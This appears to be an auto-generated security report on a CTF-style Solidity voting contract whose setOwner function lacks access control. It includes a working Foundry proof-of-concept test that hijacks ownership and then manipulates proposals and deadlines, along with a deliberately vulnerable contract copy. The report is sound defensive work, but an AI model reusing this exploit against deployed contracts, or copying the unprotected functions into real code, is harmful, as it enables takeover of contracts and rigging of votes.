# Smart Contract Vulnerability Analysis Report

**Job ID:** dc291b9c-a321-4adb-b11c-fdf5f8c09718
**Date:** 2025-03-21 01:02:39

**Contract Preview:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CTFVoting {
    struct Proposal {
        string description;
        uint256 voteCount;
    }
    
    Proposal[] public proposals;
    mapping(address => bool) public hasVoted;
    address public owner;
    uint256 public votingDeadline;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    constructor(uint256 duration, string[] memory proposalDescriptions) {
...
```

## Vulnerability Summary

Found 2 potential vulnerabilities:

| # | Vulnerability Type | Confidence | Affected Functions |
|---|-------------------|------------|--------------------|
| 1 | access_control | 1.00 | setOwner, addProposal, extendVoting |
| 2 | business_logic | 0.20 | extendVoting, addProposal |

## Detailed Analysis

### Vulnerability #1: access_control

**Confidence:** 1.00

**Reasoning:**

The function setOwner does not have any authorization check (e.g., the onlyOwner modifier) so any user can call it to change the contract owner. This allows an attacker to take over owner-only privileges and then manipulate other sensitive functionalities like addProposal and extendVoting.

**Validation:**

The setOwner function has no access control (e.g. no onlyOwner modifier), allowing anyone to call it and change contract ownership. This is a critical vulnerability because an attacker can hijack ownership and subsequently use owner-only functions like extendVoting and addProposal to manipulate the voting process.

**Code Snippet:**

```solidity
function setOwner(address newOwner) public {
        owner = newOwner;
    }

function addProposal(string memory description) public onlyOwner {
        require(block.timestamp < votingDeadline, "Voting ended");
        proposals.push(Proposal({description: description, voteCount: 0}));
    }

function extendVoting(uint256 extraTime) public onlyOwner {
        votingDeadline += extraTime;
    }
```

**Affected Functions:** setOwner, addProposal, extendVoting

**Exploit Plan:**

*Setup Steps:*

- Step 1: Create a test environment that demonstrates the vulnerability
- Step 2: Prepare necessary contracts and accounts for the demonstration

*Execution Steps:*

- Step 1: Deploy the vulnerable contract and show that the setOwner function can be called by any account to change ownership.
- Step 2: Demonstrate that once ownership is taken by an attacker-controlled account, the attacker can call owner-only functions like addProposal and extendVoting to manipulate contract state.

*Validation Steps:*

- Step 1: Explain that the vulnerability violates access control principles by failing to restrict owner-only functions with proper authorization checks.
- Step 2: Show how developers can mitigate the issue by implementing authorization modifiers (e.g., onlyOwner) on functions such as setOwner, addProposal, and extendVoting.

---

### Vulnerability #2: business_logic

**Confidence:** 0.20

**Reasoning:**

The design allows the owner to extend the voting deadline at any time using extendVoting, and also to add proposals using addProposal during the voting period. While these functions are marked onlyOwner, the missing access control in setOwner lets any attacker become the owner. This creates an economic incentive misalignment: an attacker can hijack the contract and arbitrarily prolong the voting period or inject proposals to rig the outcome, undermining the proper operation of the voting system.

**Validation:**

The functions extendVoting and addProposal are restricted by onlyOwner and are likely intended to allow administrative control over voting parameters. On their own and assuming the owner is trusted, they represent design choices rather than vulnerabilities. Their potential abuse becomes a concern only if the ownership control is compromised (as in vulnerability #0), but in a correctly permissioned contract they are not exploitable business logic flaws.

**Code Snippet:**

```solidity
function extendVoting(uint256 extraTime) public onlyOwner {
        votingDeadline += extraTime;
    }

function addProposal(string memory description) public onlyOwner {
        require(block.timestamp < votingDeadline, "Voting ended");
        proposals.push(Proposal({description: description, voteCount: 0}));
    }
```

**Affected Functions:** extendVoting, addProposal

---

## Proof of Concept Exploits

### PoC #1: access_control

**File:** /Users/advait/Desktop/NTU/fyp-fr/exploit/src/test/PoC_unknown_1742490155.sol

**Execution:** ✅ SUCCESS

**Exploit Code:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

// Import the base test contract
import "./basetest.sol";

/*
    VulnerableContract demonstrates a common access control flaw:
    - The setOwner() function, which is expected to be callable only by the current owner,
      can be called by any account. This allows an attacker to seize ownership.
    - After taking control, the attacker can call owner-only functions like addProposal() and
      extendVoting() to manipulate critical contract state.
      
    How to mitigate:
    - Use proper authorization checks (e.g., onlyOwner modifiers) on functions that should be
      restricted to certain roles.
*/
contract VulnerableContract {
    address public owner;
    Proposal[] public proposals;
    uint public votingEnd;

    struct Proposal {
        string description;
        uint voteCount;
    }

    // Constructor sets the initial owner and voting end time.
    constructor() {
        owner = msg.sender;
        votingEnd = block.timestamp + 1 days;
    }

    // Vulnerable: No access control; any account can change the owner.
    function setOwner(address _newOwner) public returns (bool) {
        owner = _newOwner;
        return true;
    }

    // Vulnerable: Expected to be owner-only, but missing access control.
    function addProposal(string calldata description) public returns (bool) {
        proposals.push(Proposal(description, 0));
        return true;
    }

    // Vulnerable: Expected to be owner-only, but missing access control.
    function extendVoting(uint extraTime) public returns (bool) {
        votingEnd += extraTime;
        return true;
    }
}

contract YourTest is BaseTestWithBalanceLog {
    VulnerableContract vulnerable;
    
    // setUp() ensures the test contract has enough ETH.
    function setUp() public {
        // Allocate 100 ETH to this test contract
        vm.deal(address(this), 100 ether);
        // Deploy the VulnerableContract
        vulnerable = new VulnerableContract();
    }
    
    // Test demonstrating the access control vulnerability.
    // The balanceLog modifier logs balance changes.
    function testExploit() public balanceLog {
        // Ensure the test contract has at least 10 ETH
        require(address(this).balance >= 10 ether, "Insufficient ETH balance for test");
        vm.deal(address(this), 10 ether);

        // Assume attacker is a different account (simulate with address derived from cheat codes)
        address attacker = vm.addr(1);

        // Log initial owner (should be the deployer of VulnerableContract)
        address initialOwner = vulnerable.owner();
        require(initialOwner != address(0), "Initial owner should not be zero");

        // Attacker calls setOwner() to take over the contract.
        // Using vm.prank to simulate the call coming from the attacker.
        vm.prank(attacker);
        bool successSetOwner = vulnerable.setOwner(attacker);
        require(successSetOwner, "setOwner call failed");

        // Verify that the owner is now the attacker.
        require(vulnerable.owner() == attacker, "Ownership transfer failed");

        // Now, attacker (the new owner due to vulnerability) calls addProposal().
        string memory proposalDescription = "Attack Proposal";
        vm.prank(attacker);
        bool successAddProposal = vulnerable.addProposal(proposalDescription);
        require(successAddProposal, "addProposal call failed");

        // Check that the proposal was added.
        // We use a public getter on the proposals array by index.
        (string memory desc, uint voteCount) = vulnerable.proposals(0);
        require(keccak256(bytes(desc)) == keccak256(bytes(proposalDescription)), "Proposal description mismatch");
        require(voteCount == 0, "Unexpected vote count");

        // Attacker extends the voting period using extendVoting().
        uint extraTime = 3600; // 1 hour extension
        vm.prank(attacker);
        bool successExtendVoting = vulnerable.extendVoting(extraTime);
        require(successExtendVoting, "extendVoting call failed");

        // Validate that the voting end time was extended.
        // We assume that the initial votingEnd was close to block.timestamp + 1 days.
        uint newVotingEnd = vulnerable.votingEnd();
        require(newVotingEnd >= block.timestamp + 1 days, "Voting period not extended correctly");

        /*
            Educational Note:
            The vulnerability in the VulnerableContract arises from missing access control modifiers.
            All functions that should be limited to the contract owner (e.g., addProposal, extendVoting)
            and the sensitive setOwner function are exposed to any caller.
            
            To mitigate this, developers should implement a modifier like:
            
            modifier onlyOwner() {
                require(msg.sender == owner, "Caller is not the owner");
                _;
            }
            
            And then apply it to functions that need protection, e.g.,
            
            function setOwner(address _newOwner) public onlyOwner returns (bool) { ... }
            
            This prevents unauthorized accounts from manipulating the contract's state.
        */
    }
}
```

---

## Recommendations

For each identified vulnerability, consider implementing the following mitigations:

- **For Access Control**: Implement proper authorization checks and use the Ownable pattern.
- **For All Vulnerabilities**: Consider a professional audit before deploying to production.

*This report was generated automatically by the Smart Contract Vulnerability Analyzer.*
